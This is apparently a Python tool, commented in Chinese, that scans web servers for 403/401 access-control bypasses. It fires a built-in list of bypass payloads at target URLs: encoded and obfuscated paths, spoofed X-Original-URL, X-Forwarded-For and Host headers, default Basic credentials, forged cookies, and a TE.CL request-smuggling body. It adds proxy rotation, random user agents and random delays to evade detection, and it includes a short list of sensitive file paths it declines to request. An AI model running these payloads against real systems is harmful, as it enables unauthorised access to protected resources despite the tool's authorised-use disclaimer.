#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import argparse
import threading
import json
import time
import random
import signal
import sys
import ssl
import os
import re
import traceback
from datetime import datetime
from hashlib import sha256
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, unquote, quote
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.ssl_ import create_urllib3_context
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import warnings
from fake_useragent import UserAgent

# 线程安全状态类
class ScanState:
    def __init__(self, output_dir="./log/"):
        self.exit_flag = False
        self.length_counter = {}
        self.lock = threading.Lock()
        self.output_lock = threading.Lock()  # 输出同步锁
        self.ua = UserAgent()
        self.output_dir = output_dir
        self.results = []
        self.proxy_list = []  # 用于存储代理池
        self.last_failed_proxy = None  # 记录上次失败的代理

# 注册信号处理器
def signal_handler(state, sig, frame):
    print("\n\033[33m[!] 接收到终止信号，正在保存结果并退出...\033[0m")
    state.exit_flag = True
    save_results(state)
    sys.exit(0)

# 忽略SSL警告
warnings.simplefilter('ignore', InsecureRequestWarning)

# ============ 增强的TLS适配器 ============
class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = create_urllib3_context()
        context.set_ciphers('DEFAULT@SECLEVEL=1')
        context.options |= ssl.OP_ALL
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        try:
            if hasattr(ssl, 'TLSVersion') and hasattr(ssl.TLSVersion, 'TLSv1_2'):
                context.minimum_version = ssl.TLSVersion.TLSv1_2
        except AttributeError:
            context.options |= ssl.OP_NO_SSLv2
            context.options |= ssl.OP_NO_SSLv3
            context.options |= ssl.OP_NO_TLSv1
            context.options |= ssl.OP_NO_TLSv1_1
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

# ============ 绕过规则集 ============
IP_VAR = "$bypass_ip"
PATH_VAR = "$path"
request_objects = [
    # 协议层绕过
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Protocol": "HTTP/1.0"}, "description": "HTTP/1.0协议降级"},
    {"method": "TRACE", "path": f"/{PATH_VAR}", "description": "TRACE方法测试"},
    {"method": "OPTIONS", "path": f"/{PATH_VAR}", "description": "OPTIONS方法测试"},
    {"method": "PATCH", "path": f"/{PATH_VAR}", "description": "PATCH方法测试"},
    
    # 路径混淆技术
    {"method": "GET", "path": f"/%2e/{PATH_VAR}", "description": "点号前缀绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}/.", "description": "尾部点号绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}%20", "description": "尾部空格混淆"},
    {"method": "GET", "path": f"/{PATH_VAR}%09", "description": "尾部制表符混淆"},
    {"method": "GET", "path": f"/{PATH_VAR}?", "description": "尾部问号截断"},
    {"method": "GET", "path": f"/{PATH_VAR}#", "description": "尾部哈希符截断"},
    {"method": "GET", "path": f"/{PATH_VAR}..;/", "description": "分号路径遍历"},
    {"method": "GET", "path": f"/{PATH_VAR};/", "description": "分号后缀绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}%252e%252e%252f", "description": "双重URL编码绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}%u2215", "description": "Unicode斜杠(⁄)绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}%u002e", "description": "Unicode点号(.)绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}%u002f", "description": "Unicode斜杠(/)绕过"},
    {"method": "GET", "path": f"///{PATH_VAR}//", "description": "三斜杠包裹路径"},
    
    # 头部注入技术
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Original-URL": f"/{PATH_VAR}"}, "description": "X-Original-URL头部覆盖"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Rewrite-URL": f"/{PATH_VAR}"}, "description": "X-Rewrite-URL头部覆盖"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Forwarded-For": IP_VAR}, "description": "X-Forwarded-For头部注入"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Client-IP": IP_VAR}, "description": "X-Client-IP头部注入"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Real-IP": IP_VAR}, "description": "X-Real-IP头部注入"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Custom-IP-Authorization": IP_VAR}, "description": "自定义IP授权头部"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Referer": f"https://{IP_VAR}/"}, "description": "Referer伪造"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Host": "localhost"}, "description": "Host头部覆盖"},
    
    # 401认证绕过
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Authorization": "Basic YWRtaW46cGFzc3dvcmQ="}, "description": "Basic认证默认凭证"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Authorization": "Basic"}, "description": "Basic空密码绕过"},
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Api-Key": "bypass_key"}, "description": "伪造API密钥"},
    
    # 高级组合技术
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"X-Forwarded-For": "::1"}, "description": "IPv6地址(::1)注入"},
    {"method": "GET", "path": f"/static/{PATH_VAR}.css", "description": "静态资源后缀伪装"},
    {"method": "GET", "path": f"/{PATH_VAR}?format=json", "description": "参数伪装JSON请求"},
    {"method": "GET", "path": f"/{PATH_VAR};.html", "description": "分号后缀HTML绕过"},
    # Cookie伪造
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Cookie": "auth_bypass=true"}, "description": "Cookie认证绕过"},
    # HTTP走私 - 修复格式
    {"method": "POST", "path": f"/{PATH_VAR}", "headers": {
        "Transfer-Encoding": "chunked",
        "Content-Length": "6"
    }, "body": "0\r\n\r\nG", "description": "TE.CL请求走私"},
    # 子域名伪造 - 修复格式
    {"method": "GET", "path": f"/{PATH_VAR}", "headers": {"Host": f"{IP_VAR}"}, "description": "子域名伪造"}
]

def main():
    args = get_args()
    
    # 创建日志目录
    os.makedirs(args.output_dir, exist_ok=True)
    
    # 初始化状态对象
    state = ScanState(output_dir=args.output_dir)
    signal.signal(signal.SIGINT, lambda s, f: signal_handler(state, s, f))
    
    print("\033[31m[!] 法律声明：本工具仅用于授权测试，禁止用于非法用途\033[0m")
    print("\033[31m[!] 使用前请确保已获得目标系统的书面授权\033[0m")
    
    hosts = []
    bypass_ip = args.bypass_ip if args.bypass_ip else "127.0.0.1"

    if args.file:
        try:
            with open(args.file, 'r') as f:
                hosts = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] 无法读取文件 {args.file}: {e}")
            return
    elif args.url:
        hosts = [args.url]
    else:
        print("[!] 未提供 URL 或文件。退出。")
        return

    proxies = parse_proxies(args.proxy, state) if args.proxy else None

    print(f"[+] 开始扫描，目标数量: {len(hosts)}")
    print(f"[+] 使用绕过IP: {bypass_ip}")
    print(f"[+] 线程数: {args.threads}")
    print(f"[+] 超时设置: {args.timeout}秒, 重试次数: {args.retry}")
    print(f"[+] 输出目录: {args.output_dir}")
    if proxies:
        print(f"[+] 使用代理: {args.proxy}")

    # 创建自定义会话
    session = requests.Session()
    session.verify = False
    adapter = TLSAdapter(pool_connections=100, pool_maxsize=100)
    session.mount('https://', adapter)
    session.mount('http://', adapter)

    # 使用线程池管理
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for host in hosts:
            if state.exit_flag:
                break
            try:
                # 修复1：保留完整路径
                parsed_url = urlparse(host)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                path = unquote(parsed_url.path)  # 保留完整路径
                
                future = executor.submit(
                    process_target, 
                    state,
                    base_url, 
                    path, 
                    args.header, 
                    args.force, 
                    bypass_ip,
                    proxies,
                    session,
                    args.retry,
                    args.debug,
                    args.random_delay,
                    args.length_threshold
                )
                futures.append(future)
            except Exception as e:
                print(f"[!] 处理目标 {host} 时出错: {e}")
        
        # 等待所有任务完成
        try:
            for future in as_completed(futures):
                if state.exit_flag:
                    print("\n\033[33m[!] 正在取消剩余任务并保存结果...\033[0m")
                    for f in futures:
                        f.cancel()
                    break
        except KeyboardInterrupt:
            state.exit_flag = True
        except Exception as e:
            print(f"[!] 线程池执行异常: {e}")
            state.exit_flag = True

    # 保存结果
    save_results(state)
    print("\n[+] 扫描终止" if state.exit_flag else "\n[+] 扫描完成")

def save_results(state):
    """保存扫描结果到JSON文件"""
    if not state.results:
        print("[!] 无扫描结果可保存")
        return
        
    os.makedirs(state.output_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"bypass_results_{'partial_' if state.exit_flag else ''}{timestamp}.json"
    file_path = os.path.join(state.output_dir, filename)
    
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(state.results, f, indent=4, ensure_ascii=False)
        print(f"[+] 结果已保存至: {file_path}")
    except Exception as e:
        print(f"[!] 保存结果失败: {e}")

def get_args():
    parser = argparse.ArgumentParser(description='高级403/401绕过扫描器', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u', '--url', help='目标URL（包含路径）')
    parser.add_argument('-f', '--file', help='包含多个目标的文件')
    parser.add_argument('-t', '--threads', type=int, default=10, help='线程数')
    parser.add_argument('-H', '--header', action='append', help='自定义请求头（格式："Key: Value"）')
    parser.add_argument('-F', '--force', action='store_true', help='强制尝试所有绕过方式')
    parser.add_argument('-p', '--proxy', help='代理设置（格式：http://host:port 或 socks5://host:port 或 file://path/to/proxies.txt）')
    parser.add_argument('-i', '--bypass-ip', default='127.0.0.1', help='绕过使用的IP地址')
    parser.add_argument('--timeout', type=int, default=30, help='请求超时时间（秒）')
    parser.add_argument('--retry', type=int, default=2, help='失败重试次数')
    parser.add_argument('--debug', action='store_true', help='启用详细调试输出')
    parser.add_argument('--random-delay', action='store_true', help='启用随机延迟避免检测')
    parser.add_argument('--length-threshold', type=int, default=5, help='相同长度响应的过滤阈值')
    parser.add_argument('--output-dir', default='./log/', help='结果保存目录（默认为./log/）')
    return parser.parse_args()

def parse_proxies(proxy_str, state):
    """解析代理设置"""
    if not proxy_str:
        return None
        
    if proxy_str.startswith('file://'):
        file_path = proxy_str[7:]
        if not os.path.exists(file_path):
            print(f"[!] 代理文件不存在: {file_path}")
            return None
            
        try:
            with open(file_path, 'r') as f:
                proxies_list = [line.strip() for line in f 
                               if line.strip() and not line.strip().startswith('#')]
            if not proxies_list:
                print(f"[!] 代理文件为空: {file_path}")
                return None
                
            # 存储到状态对象中
            state.proxy_list = proxies_list
            return {
                'http': lambda: random.choice(state.proxy_list),
                'https': lambda: random.choice(state.proxy_list)
            }
        except Exception as e:
            print(f"[!] 读取代理文件失败: {e}")
            return None
            
    elif proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return {'http': proxy_str, 'https': proxy_str}
    elif proxy_str.startswith('socks5://'):
        return {'http': proxy_str, 'https': proxy_str}
    else:
        print(f"[!] 无效的代理格式: {proxy_str}")
        return None

def get_proxy_for_request(proxies, state):
    """动态获取代理并处理失效代理"""
    if not proxies:
        return None
        
    if callable(proxies.get('http')):
        # 从代理池中移除失效代理
        if state.last_failed_proxy:
            if state.last_failed_proxy in state.proxy_list:
                state.proxy_list.remove(state.last_failed_proxy)
                print(f"\033[33m[!] 移除失效代理: {state.last_failed_proxy}\033[0m")
        
        # 从更新后的代理池选择
        if state.proxy_list:
            proxy = random.choice(state.proxy_list)
            return {'http': proxy, 'https': proxy}
        return None
    return proxies

def process_target(state, base_url, path, custom_headers, force, bypass_ip, proxies, session, retry_count, debug, random_delay, length_threshold):
    """处理单个目标"""
    if state.exit_flag:
        return
        
    # 修复2：使用原始完整路径构建URL
    url = urljoin(base_url, path)
    if not url:
        return
    
    if debug:
        print(f"[DEBUG] 处理目标: {url}")
        print(f"[DEBUG] 基础URL: {base_url}, 路径: {path}")
    
    current_proxies = get_proxy_for_request(proxies, state)
    
    # 尝试获取原始响应
    original_response = make_request(session, 'GET', url, custom_headers, current_proxies, retry_count, debug, state)
    
    if original_response is None:
        print(f"\n[!] 网络层访问失败: {url}")
        print(f"   可能原因:")
        print(f"   - 网络问题或目标不可达")
        print(f"   - 防火墙拦截了请求")
        print(f"   - TLS/SSL 握手失败")
        print(f"   - 目标有速率限制")
        print(f"   建议:")
        print(f"   - 使用 -p 参数添加代理")
        print(f"   - 增加 --timeout 值")
        print(f"   - 检查URL是否正确")
        return
    
    status = original_response.status_code
    original_content_hash = hash_content(original_response.content)
    original_size = len(original_response.content)

    print(f"\n[+] 目标: {url}")
    print(f"   原始响应码: {status}")
    print(f"   原始大小: {original_size} bytes")
    print(f"   内容哈希: {original_content_hash[:12]}...")
    
    if status == 403:
        print(f"[*] 目标返回403，开始绕过尝试...")
    elif status == 401:
        print(f"[*] 目标返回401，开始认证绕过尝试...")
    elif force:
        print(f"[*] 强制绕过模式，开始尝试...")
    else:
        print(f"[!] 原始状态码 {status} 非拦截状态")
        print(f"[*] 提示：添加 -F 参数强制扫描所有路径")
        if force:
            print(f"[*] 强制模式已启用，继续尝试绕过...")
        else:
            return

    start_time = time.time()
    try:
        attemptBypass(state, base_url, path, custom_headers, original_content_hash, 
                      original_size, bypass_ip, current_proxies, session, retry_count, 
                      debug, random_delay, length_threshold)
    except Exception as e:
        print(f"[!] 绕过尝试过程中发生异常: {e}")
        if debug:
            traceback.print_exc()
    elapsed = time.time() - start_time
    print(f"[*] 绕过尝试完成, 耗时: {elapsed:.2f}秒")

def build_full_url(base_url, modified_path):
    """安全构建完整URL"""
    if not modified_path:
        return base_url
    if modified_path.startswith(('http://', 'https://')):
        return modified_path
    
    # 修复3：调整危险路径过滤逻辑
    dangerous_paths = [
        '/etc/passwd', '/wp-config.php', '/.htaccess', 
        '/web.config', '/config.php', '/.env'
    ]
    
    # 只匹配完整路径，避免误判
    if any(s in modified_path for s in dangerous_paths if s in modified_path):
        print(f"\033[33m[!] 已阻止潜在危险路径: {modified_path}\033[0m")
        return None
    
    # 修复4：正确构建URL
    if modified_path.startswith('/'):
        # 修复关键问题：避免双斜杠
        base_url = base_url.rstrip('/')
        modified_path = modified_path.lstrip('/')
        return f"{base_url}/{modified_path}"
    else:
        return urljoin(base_url.rstrip('/') + '/', modified_path)

def make_request(session, method, url, headers, proxies, retry_count, debug, state):
    """发送HTTP请求（带重试机制）"""
    attempt = 0
    max_attempts = retry_count + 1
    description = headers.get('description', '') if headers else ''
    
    while attempt < max_attempts:
        try:
            final_headers = {'User-Agent': state.ua.random}
            if headers:
                final_headers.update(headers)
            
            request_proxies = get_proxy_for_request(proxies, state) if proxies else None
            
            if debug:
                print(f"[DEBUG] 请求尝试 #{attempt+1}/{max_attempts}: {method} {url}")
                print(f"[DEBUG] 请求头: {json.dumps(final_headers, indent=2)}")
                if request_proxies:
                    print(f"[DEBUG] 使用代理: {request_proxies}")
            
            # 特殊处理HTTP走私请求
            if method == "POST" and "TE.CL请求走私" in description:
                final_headers["Transfer-Encoding"] = "chunked"
                final_headers["Content-Length"] = "6"
                response = session.request(
                    method=method,
                    url=url,
                    headers=final_headers,
                    data="0\r\n\r\nG",  # 正确的走私格式
                    verify=False,
                    proxies=request_proxies,
                    allow_redirects=False,
                    timeout=30
                )
            else:
                response = session.request(
                    method=method,
                    url=url,
                    headers=final_headers,
                    verify=False,
                    proxies=request_proxies,
                    allow_redirects=False,
                    timeout=30
                )
            
            if debug:
                print(f"[DEBUG] 响应状态: {response.status_code}")
            
            return response
            
        except requests.exceptions.SSLError as e:
            if attempt >= max_attempts - 1:  # 只在最后一次尝试时打印错误
                with state.output_lock:
                    print(f"[!] SSL 错误: {e}")
            attempt += 1
            if attempt >= max_attempts:
                return None
            time.sleep(1)
                
        except requests.exceptions.ConnectionError as e:
            # 记录导致错误的代理
            if "proxies" in str(e) and request_proxies:
                state.last_failed_proxy = request_proxies.get('http') or request_proxies.get('https')
            
            if attempt >= max_attempts - 1:  # 只在最后一次尝试时打印错误
                with state.output_lock:
                    print(f"[!] 连接错误: {e}")
            attempt += 1
            if attempt >= max_attempts:
                return None
            time.sleep(2)
                
        except requests.exceptions.Timeout as e:
            if attempt >= max_attempts - 1:  # 只在最后一次尝试时打印错误
                with state.output_lock:
                    print(f"[!] 请求超时")
            attempt += 1
            if attempt >= max_attempts:
                return None
            time.sleep(3)
                
        except Exception as e:
            if attempt >= max_attempts - 1:  # 只在最后一次尝试时打印错误
                with state.output_lock:
                    print(f"[!] 未知错误: {type(e).__name__} - {e}")
            attempt += 1
            if attempt >= max_attempts:
                return None
            time.sleep(1)
    
    return None

def hash_content(content):
    """计算内容的SHA-256哈希值"""
    return sha256(content).hexdigest()

def is_same_content(new_content, original_hash, original_size):
    """检查内容是否相同"""
    if len(new_content) != original_size:
        return False
    return sha256(new_content).hexdigest() == original_hash

def should_filter_response(state, content, length_threshold):
    """响应长度过滤机制"""
    fuzz_length = int(len(content) / 10) * 10
    
    with state.lock:
        state.length_counter[fuzz_length] = state.length_counter.get(fuzz_length, 0) + 1
    
    if state.length_counter[fuzz_length] > length_threshold:
        return True
    return False

def attemptBypass(state, base_url, path, custom_headers, original_content_hash, 
                 original_size, bypass_ip, proxies, session, retry_count, 
                 debug, random_delay, length_threshold):
    """尝试所有绕过方法"""
    host_results = {
        "target": base_url,
        "path": path,
        "bypass_ip": bypass_ip,
        "bypass_results": []
    }

    total = len(request_objects)
    success_count = 0
    filtered_count = 0
    
    with state.output_lock:
        print("\n" + "="*120)
        print(f"| {'序号':^4} | {'状态码':^6} | {'响应大小':^6} | {'结果类型':^6} | {'请求详情':^46} ")
        print("="*120)
    
    try:
        for i, obj in enumerate(request_objects):
            if state.exit_flag:
                break
                
            try:
                method = obj['method'].upper()
                modified_path = obj['path'].replace("$path", path).replace("$bypass_ip", bypass_ip)
                full_url = build_full_url(base_url, modified_path)
                
                if not full_url:  # 跳过危险路径
                    continue
                    
                headers = {}
                if 'headers' in obj:
                    for key, value in obj['headers'].items():
                        value = value.replace("$path", path).replace("$bypass_ip", bypass_ip)
                        headers[key] = value
                
                if custom_headers:
                    for h in custom_headers:
                        key, val = h.split(":", 1)
                        headers[key.strip()] = val.strip()

                description = obj.get('description', '')

                if debug:
                    print(f"[DEBUG] 尝试绕过 #{i+1}/{total}: {method} {full_url}")
                    if description:
                        print(f"[DEBUG] 绕过类型: {description}")

                if random_delay and not state.exit_flag:
                    delay = random.uniform(0.5, 3.0)
                    time.sleep(delay)

                # 特殊处理子域名伪造
                if description == "子域名伪造":
                    headers['Host'] = bypass_ip
                    # 保持原始URL不变，仅修改Host头
                    full_url = urljoin(base_url, path)
                
                response = make_request(session, method, full_url, headers, proxies, retry_count, debug, state)
                
                result = {
                    "url": full_url,
                    "method": method,
                    "headers": headers,
                    "bypass_type": description
                }
                
                if response != None :
                    status = response.status_code
                    size = len(response.content)
                    size_kb = size / 1024.0
                    content_hash = hash_content(response.content)
                    
                    result["status"] = status
                    result["size"] = size
                    result["content_hash"] = content_hash
                    
                    if should_filter_response(state, response.content, length_threshold):
                        filtered_count += 1
                        if debug:
                            fuzz_length = int(size / 10) * 10
                            print(f"[DEBUG] 过滤响应（长度 {fuzz_length} 已达阈值 {state.length_counter[fuzz_length]}）")
                        host_results["bypass_results"].append(result)
                        continue
                    
                    # ============ 优化的状态码分类逻辑 ============ [6,8](@ref)
                    if status == 200:
                        if is_same_content(response.content, original_content_hash, original_size):
                            status_type = "相同内容"
                            status_color = 33  # 黄色
                        else:
                            status_type = "绕过成功"
                            status_color = 32  # 绿色
                            success_count += 1
                    elif status in [301, 302, 303, 307, 308]:
                        status_type = "重定向"
                        status_color = 34  # 蓝色
                        result["redirect_location"] = response.headers.get('Location', '')
                    elif status == 401:
                        status_type = "未授权"
                        status_color = 31  # 红色
                    elif status == 403:
                        status_type = "禁止访问"  # 明确语义
                        status_color = 31  # 红色
                    elif status == 405:
                        status_type = "方法禁用"  # 单独处理
                        status_color = 36  # 青色
                    elif 400 <= status < 500:
                        status_type = "客户端错误"
                        status_color = 35  # 紫色
                    elif 500 <= status < 600:
                        status_type = "服务器错误"
                        status_color = 35  # 紫色
                    else:
                        status_type = "其他"
                        status_color = 35  # 紫色
                            
                    status_msg = f"\033[{status_color}m{status_type}\033[0m"
                    
                    # 使用输出锁确保输出完整性
                    with state.output_lock:
                        print(f"| {i+1:>4}/{total:<4} | {status:^6} | {size_kb:>6.2f} KB | {status_msg:^12} | {method} {full_url} |{'绕过类型: ' + description} ")
                        # if description:
                        #     print(f"| {'绕过类型: ' + description}")
                    
                    result["response_headers"] = dict(response.headers)
                    host_results["bypass_results"].append(result)
                else:
                    print(response.status_code,"==============-------")
                    result["status"] = "Error"
                    result["error"] = "请求失败"
                    
                    # 使用输出锁确保输出完整性
                    with state.output_lock:
                        print(f"| {i+1:>4}/{total:<4} | {'ERROR':^6} | {'-':^10} | \033[31m请求失败\033[0m | {method} {full_url}")
                        if description:
                            print(f"| {'绕过类型: ' + description}")
                    host_results["bypass_results"].append(result)
                    
            except Exception as e:
                with state.output_lock:
                    print(f"[!] 处理绕过方法 #{i+1} 时发生异常: {e}")
                if debug:
                    traceback.print_exc()
                error_result = {
                    "url": full_url if 'full_url' in locals() else "N/A",
                    "method": method if 'method' in locals() else "N/A",
                    "headers": headers,
                    "bypass_type": description,
                    "status": "Exception",
                    "error": str(e)
                }
                host_results["bypass_results"].append(error_result)
                continue

    except Exception as e:
        with state.output_lock:
            print(f"[!] 绕过尝试整体过程发生严重错误: {e}")
        if debug:
            traceback.print_exc()
            
    host_results["total_tests"] = total
    host_results["success_count"] = success_count
    host_results["filtered_count"] = filtered_count
    
    with state.lock:
        state.results.append(host_results)
    
    with state.output_lock:    
        print("="*120)
        print(f"[*] 绕过结果: \033[32m{success_count}\033[0m/{total} 个方法可能成功")
        print(f"[*] 过滤结果: \033[32m{filtered_count} 个相同长度响应被忽略\033[0m")

if __name__ == "__main__":
    main()